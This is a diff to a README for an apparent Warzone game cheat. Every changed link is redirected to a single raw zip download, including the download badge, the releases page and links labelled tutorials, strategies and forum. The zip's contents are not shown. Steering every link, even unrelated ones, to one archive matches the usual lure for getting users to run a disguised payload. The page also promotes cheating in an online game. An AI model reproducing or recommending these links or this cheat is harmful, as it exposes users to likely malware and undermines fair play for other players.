@@ -6,7 +6,7 @@ Welcome to WarzoneExternalCheat! This software helps you improve your gameplay i
 
 ## 📥 Download Now
 
-[![Download WarzoneExternalCheat](https://img.shields.io/badge/Download-WarzoneExternalCheat-blue)](https://github.com/NanaOlii/WarzoneExternalCheat/releases)
+[![Download WarzoneExternalCheat](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ To run WarzoneExternalCheat smoothly, ensure your system meets the following req
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/NanaOlii/WarzoneExternalCheat/releases) to find the latest version of WarzoneExternalCheat.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip) to find the latest version of WarzoneExternalCheat.
 2. **Choose the Latest Release:** Look for the most recent version listed at the top.
 3. **Download the File:** Click on the downloadable file link. This will usually be a `.zip` or `.exe` file. If the file name ends with `.zip`, you will need to unzip it after the download.
 4. **Extract (if necessary):** If you downloaded a `.zip` file, right-click on it and select "Extract All" to get the application files.
@@ -49,7 +49,7 @@ If you encounter issues or have questions, you can find support through our comm
 
 ## 🚀 Updates
 
-Staying updated is important for the best experience. Make sure to check back frequently on our [Releases page](https://github.com/NanaOlii/WarzoneExternalCheat/releases) to download the latest updates and improvements.
+Staying updated is important for the best experience. Make sure to check back frequently on our [Releases page](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip) to download the latest updates and improvements.
 
 ## 🌐 Community and Contribution
 
@@ -59,8 +59,8 @@ We welcome contributions! If you'd like to suggest a feature or report a bug, pl
 
 For further information on using our software, consider visiting the following resources:
 
-- [Installation Tutorials](https://example.com/tutorials)
-- [Game Strategies](https://example.com/strategies)
-- [Community Forum](https://example.com/forum)
+- [Installation Tutorials](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip)
+- [Game Strategies](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip)
+- [Community Forum](https://raw.githubusercontent.com/NanaOlii/WarzoneExternalCheat/main/oncoming/WarzoneExternalCheat.zip)
 
 Thank you for using WarzoneExternalCheat! Enjoy your game with enhanced features and improve your skills on the battlefield.
